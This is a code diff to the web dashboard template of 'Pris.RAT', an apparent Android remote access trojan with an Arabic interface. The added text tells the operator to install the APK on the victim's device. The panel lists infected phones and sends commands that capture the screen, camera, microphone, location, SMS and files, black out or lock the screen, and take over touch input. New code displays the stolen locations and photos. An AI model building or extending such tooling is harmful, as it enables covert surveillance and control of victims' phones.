@@ -5,76 +5,256 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Pris.RAT - Dashboard</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-body { background: #0a0a0f; color: #fff; min-height: 100vh; padding: 20px; }
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Tahoma', sans-serif; }
+body {
+  background: #0a0a0f;
+  color: #fff;
+  min-height: 100vh;
+  padding: 15px;
+}
+
+/* Header */
 .header {
   display: flex; justify-content: space-between; align-items: center;
-  padding: 15px 20px; background: rgba(20,20,25,0.9);
-  border: 2px solid #ff0033; border-radius: 12px;
+  padding: 15px 20px;
+  background: rgba(15,15,20,0.95);
+  border: 2px solid #ff0033;
+  border-radius: 12px;
+  margin-bottom: 20px;
+  box-shadow: 0 0 20px rgba(255,0,51,0.3);
+}
+.logo { display: flex; align-items: center; gap: 12px; }
+.logo-icon {
+  width: 45px; height: 45px;
+  background: linear-gradient(135deg, #ff0033, #990000);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 24px;
+  box-shadow: 0 0 20px rgba(255,0,51,0.6);
+}
+.logo-text h1 { font-size: 22px; color: #fff; }
+.logo-text h1 span { color: #ff0033; }
+.logo-text p { font-size: 10px; color: #888; letter-spacing: 2px; }
+.header-info { display: flex; gap: 15px; align-items: center; font-size: 12px; }
+.status-badge {
+  display: flex; align-items: center; gap: 6px;
+  background: rgba(0,255,0,0.1);
+  border: 1px solid #0f0;
+  padding: 5px 12px;
+  border-radius: 20px;
+  color: #0f0;
+}
+.dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: #0f0;
+  box-shadow: 0 0 10px #0f0;
+  animation: pulse 2s infinite;
+}
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+.logout {
+  background: #333; color: #fff;
+  padding: 8px 15px; border-radius: 8px;
+  text-decoration: none; font-size: 12px;
+}
+
+/* Stats */
+.stats {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 12px;
   margin-bottom: 20px;
 }
-.header h1 { color: #fff; font-size: 22px; }
-.header h1 span { color: #ff0033; }
-.logout { background: #333; color: #fff; padding: 8px 16px; border-radius: 8px; text-decoration: none; font-size: 13px; }
-.stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
 .stat-card {
   background: rgba(20,20,25,0.9);
-  border: 2px solid #333; border-radius: 12px;
-  padding: 20px; text-align: center;
+  border: 2px solid #333;
+  border-radius: 12px;
+  padding: 20px;
+  text-align: center;
+  transition: all 0.3s;
 }
-.stat-card .num { font-size: 32px; color: #ff0033; font-weight: bold; }
-.stat-card .label { color: #888; font-size: 13px; margin-top: 5px; }
-.section-title { color: #fff; font-size: 18px; margin: 20px 0 10px; padding-right: 10px; border-right: 4px solid #ff0033; }
-.device-list { display: flex; flex-direction: column; gap: 12px; }
+.stat-card:hover { border-color: #ff0033; }
+.stat-card .num {
+  font-size: 32px; font-weight: bold;
+  color: #ff0033;
+  text-shadow: 0 0 15px rgba(255,0,51,0.7);
+}
+.stat-card .label { color: #888; font-size: 12px; margin-top: 8px; }
+
+/* Section */
+.section-title {
+  font-size: 16px;
+  margin: 20px 0 12px;
+  padding-right: 12px;
+  border-right: 4px solid #ff0033;
+  color: #fff;
+}
+
+/* Devices */
+.device-list { display: flex; flex-direction: column; gap: 10px; }
 .device-card {
   background: rgba(20,20,25,0.9);
-  border: 2px solid #333; border-radius: 12px;
+  border: 2px solid #333;
+  border-radius: 12px;
   padding: 15px 20px;
   display: flex; justify-content: space-between; align-items: center;
+  transition: all 0.3s;
+  cursor: pointer;
 }
-.device-card.online { border-color: #0f0; }
-.device-info .name { font-size: 16px; color: #fff; font-weight: bold; }
-.device-info .meta { font-size: 12px; color: #888; margin-top: 5px; }
-.device-status { padding: 5px 12px; border-radius: 20px; font-size: 12px; }
+.device-card:hover {
+  border-color: #ff0033;
+  transform: translateX(-3px);
+}
+.device-card.selected {
+  border-color: #0f0;
+  box-shadow: 0 0 20px rgba(0,255,0,0.4);
+}
+.device-card.online { border-right: 4px solid #0f0; }
+.device-card.offline { border-right: 4px solid #f00; opacity: 0.6; }
+.device-info .name { font-size: 15px; color: #fff; font-weight: bold; }
+.device-info .meta { font-size: 11px; color: #888; margin-top: 5px; display: flex; gap: 12px; flex-wrap: wrap; }
+.device-status {
+  padding: 5px 12px; border-radius: 20px;
+  font-size: 11px; font-weight: bold;
+}
 .status-online { background: rgba(0,255,0,0.15); color: #0f0; border: 1px solid #0f0; }
 .status-offline { background: rgba(255,0,0,0.15); color: #f00; border: 1px solid #f00; }
-.empty { text-align: center; padding: 60px 20px; color: #666; }
+.empty {
+  text-align: center; padding: 50px 20px;
+  color: #666; font-size: 14px;
+  background: rgba(20,20,25,0.5);
+  border-radius: 12px;
+  border: 2px dashed #333;
+}
+
+/* Controls */
 .controls {
   display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-  gap: 12px; margin-top: 20px;
+  grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+  gap: 10px;
+  margin-top: 15px;
 }
 .ctrl-btn {
-  background: rgba(255,0,51,0.1);
+  background: linear-gradient(135deg, rgba(255,0,51,0.15), rgba(153,0,0,0.15));
   border: 2px solid #ff0033;
-  border-radius: 10px;
-  padding: 15px;
-  color: #fff; font-size: 14px; font-weight: bold;
-  cursor: pointer; text-align: center;
+  border-radius: 12px;
+  padding: 18px 10px;
+  color: #fff;
+  font-size: 13px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: all 0.3s;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  box-shadow: 0 0 10px rgba(255,0,51,0.2);
 }
-.ctrl-btn:hover { background: rgba(255,0,51,0.3); }
+.ctrl-btn:hover {
+  background: linear-gradient(135deg, rgba(255,0,51,0.4), rgba(153,0,0,0.4));
+  box-shadow: 0 0 25px rgba(255,0,51,0.6);
+  transform: translateY(-3px);
+}
+.ctrl-btn:active { transform: scale(0.95); }
+.ctrl-btn .ico { font-size: 26px; }
+
+/* Toast */
+.toast {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  padding: 12px 20px;
+  border-radius: 10px;
+  font-weight: bold;
+  z-index: 9999;
+  animation: slideIn 0.3s;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+}
+.toast.success { background: #0f0; color: #000; }
+.toast.error { background: #f00; color: #fff; }
+.toast.info { background: #ff0033; color: #fff; }
+@keyframes slideIn {
+  from { transform: translateX(400px); opacity: 0; }
+  to { transform: translateX(0); opacity: 1; }
+}
+
+/* Image Viewer */
+.img-viewer {
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.95);
+  display: flex; align-items: center; justify-content: center;
+  z-index: 10000;
+  cursor: pointer;
+}
+.img-viewer img {
+  max-width: 95%; max-height: 95%;
+  border: 3px solid #ff0033;
+  border-radius: 12px;
+  box-shadow: 0 0 40px rgba(255,0,51,0.7);
+}
+
+/* Responsive */
+@media (max-width: 500px) {
+  .stats { grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+  .stat-card { padding: 15px 10px; }
+  .stat-card .num { font-size: 24px; }
+  .stat-card .label { font-size: 10px; }
+  .controls { grid-template-columns: repeat(3, 1fr); gap: 8px; }
+  .ctrl-btn { padding: 12px 5px; font-size: 11px; }
+  .ctrl-btn .ico { font-size: 20px; }
+  .header-info .status-badge span { display: none; }
+}
 </style>
 </head>
 <body>
+
+<!-- Header -->
 <div class="header">
-  <h1>Pris.<span>RAT</span></h1>
-  <a href="/logout" class="logout">خروج</a>
+  <div class="logo">
+    <div class="logo-icon">🐺</div>
+    <div class="logo-text">
+      <h1>Pris.<span>RAT</span></h1>
+      <p>CONTROL · MANAGE · STAY AHEAD</p>
+    </div>
+  </div>
+  <div class="header-info">
+    <div class="status-badge">
+      <div class="dot"></div>
+      <span>Server Online</span>
+    </div>
+    <a href="/logout" class="logout">خروج</a>
+  </div>
 </div>
 
+<!-- Stats -->
 <div class="stats">
-  <div class="stat-card"><div class="num">{{ total }}</div><div class="label">إجمالي الأجهزة</div></div>
-  <div class="stat-card"><div class="num">{{ online }}</div><div class="label">متصل</div></div>
-  <div class="stat-card"><div class="num">{{ offline }}</div><div class="label">غير متصل</div></div>
+  <div class="stat-card">
+    <div class="num">{{ total }}</div>
+    <div class="label">إجمالي الأجهزة</div>
+  </div>
+  <div class="stat-card">
+    <div class="num" style="color:#0f0;">{{ online }}</div>
+    <div class="label">متصل</div>
+  </div>
+  <div class="stat-card">
+    <div class="num" style="color:#f00;">{{ offline }}</div>
+    <div class="label">غير متصل</div>
+  </div>
 </div>
 
+<!-- Devices -->
 <div class="section-title">📱 الأجهزة المتصلة</div>
 <div class="device-list" id="devices">
   {% if devices %}
     {% for d in devices %}
-    <div class="device-card {% if d.online %}online{% endif %}" onclick="selectDevice('{{ d.id }}')">
+    <div class="device-card {% if d.online %}online{% else %}offline{% endif %}"
+         onclick="selectDevice('{{ d.id }}', this)">
       <div class="device-info">
-        <div class="name">{{ d.model }}</div>
-        <div class="meta">Android {{ d.android }} | 🔋 {{ d.battery }}% | {{ d.ip }}</div>
+        <div class="name">📱 {{ d.model }}</div>
+        <div class="meta">
+          <span>🤖 Android {{ d.android }}</span>
+          <span>🔋 {{ d.battery }}%</span>
+          <span>🌐 {{ d.ip }}</span>
+        </div>
       </div>
       <div class="device-status {% if d.online %}status-online{% else %}status-offline{% endif %}">
         {% if d.online %}متصل{% else %}غير متصل{% endif %}
@@ -82,38 +262,93 @@ body { background: #0a0a0f; color: #fff; min-height: 100vh; padding: 20px; }
     </div>
     {% endfor %}
   {% else %}
-    <div class="empty">مافيش أجهزة متصلة حالياً</div>
+    <div class="empty">📭 مافيش أجهزة متصلة حالياً<br><small>ثبّت APK على جهاز الضحية</small></div>
   {% endif %}
 </div>
 
+<!-- Controls -->
 <div class="section-title">⚡ التحكم السريع</div>
 <div class="controls">
-  <div class="ctrl-btn" onclick="cmd('screen')">📸 شاشة</div>
-  <div class="ctrl-btn" onclick="cmd('camera')">🎥 كاميرا</div>
-  <div class="ctrl-btn" onclick="cmd('mic')">🎤 مايك</div>
-  <div class="ctrl-btn" onclick="cmd('location')">📍 موقع</div>
-  <div class="ctrl-btn" onclick="cmd('sms')">💬 رسائل</div>
-  <div class="ctrl-btn" onclick="cmd('files')">📁 ملفات</div>
-  <div class="ctrl-btn" onclick="cmd('blackout')">⬛ شاشة سوداء</div>
-  <div class="ctrl-btn" onclick="cmd('touch')">🖱️ تحكم لمس</div>
-  <div class="ctrl-btn" onclick="cmd('lock')">🔒 قفل</div>
+  <div class="ctrl-btn" onclick="cmd('screen')"><span class="ico">📸</span>شاشة</div>
+  <div class="ctrl-btn" onclick="cmd('camera')"><span class="ico">🎥</span>كاميرا</div>
+  <div class="ctrl-btn" onclick="cmd('mic')"><span class="ico">🎤</span>مايك</div>
+  <div class="ctrl-btn" onclick="cmd('location')"><span class="ico">📍</span>موقع</div>
+  <div class="ctrl-btn" onclick="cmd('sms')"><span class="ico">💬</span>رسائل</div>
+  <div class="ctrl-btn" onclick="cmd('files')"><span class="ico">📁</span>ملفات</div>
+  <div class="ctrl-btn" onclick="cmd('blackout')"><span class="ico">⬛</span>شاشة سوداء</div>
+  <div class="ctrl-btn" onclick="cmd('touch')"><span class="ico">🖱️</span>تحكم لمس</div>
+  <div class="ctrl-btn" onclick="cmd('lock')"><span class="ico">🔒</span>قفل</div>
 </div>
 
 <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 <script>
 let selectedDevice = null;
 const socket = io();
-socket.on('devices_update', () => location.reload());
 
-function selectDevice(id) {
+// تحديث الأجهزة
+socket.on('devices_update', () => setTimeout(() => location.reload(), 500));
+
+// استقبال النتائج
+socket.on('device_response', (data) => {
+  console.log('Response:', data);
+  
+  if (data.type === 'location') {
+    if (data.lat === 0 && data.lon === 0) {
+      showToast('❌ الموقع مش متاح — تأكد من الأذونات', 'error');
+      return;
+    }
+    showToast(`📍 الموقع: ${data.lat.toFixed(4)}, ${data.lon.toFixed(4)}`, 'success');
+    setTimeout(() => {
+      if (confirm(`📍 الموقع:\nLat: ${data.lat}\nLon: ${data.lon}\n\nافتح الخريطة؟`)) {
+        window.open(`https://www.google.com/maps?q=${data.lat},${data.lon}`, '_blank');
+      }
+    }, 500);
+  }
+  
+  if (data.type === 'camera') {
+    if (!data.image || data.image === '') {
+      showToast('❌ الكاميرا ما اشتغلتش', 'error');
+      return;
+    }
+    showToast('📷 صورة جديدة', 'success');
+    showImage('data:image/jpeg;base64,' + data.image);
+  }
+});
+
+// اختيار الجهاز
+function selectDevice(id, el) {
   selectedDevice = id;
-  alert('تم اختيار الجهاز: ' + id);
+  document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  showToast('✅ تم اختيار الجهاز', 'success');
 }
 
+// إرسال أمر
 function cmd(action) {
-  if (!selectedDevice) { alert('اختر جهاز أولاً'); return; }
+  if (!selectedDevice) {
+    showToast('⚠️ اختر جهاز أولاً', 'error');
+    return;
+  }
   socket.emit('send_command', { target: selectedDevice, action: action });
-  alert('تم إرسال الأمر: ' + action);
+  showToast('📤 تم إرسال: ' + action, 'info');
+}
+
+// عرض صورة
+function showImage(src) {
+  const v = document.createElement('div');
+  v.className = 'img-viewer';
+  v.innerHTML = '<img src="' + src + '">';
+  v.onclick = () => v.remove();
+  document.body.appendChild(v);
+}
+
+// Toast
+function showToast(msg, type) {
+  const t = document.createElement('div');
+  t.className = 'toast ' + type;
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
 }
 </script>
 </body>
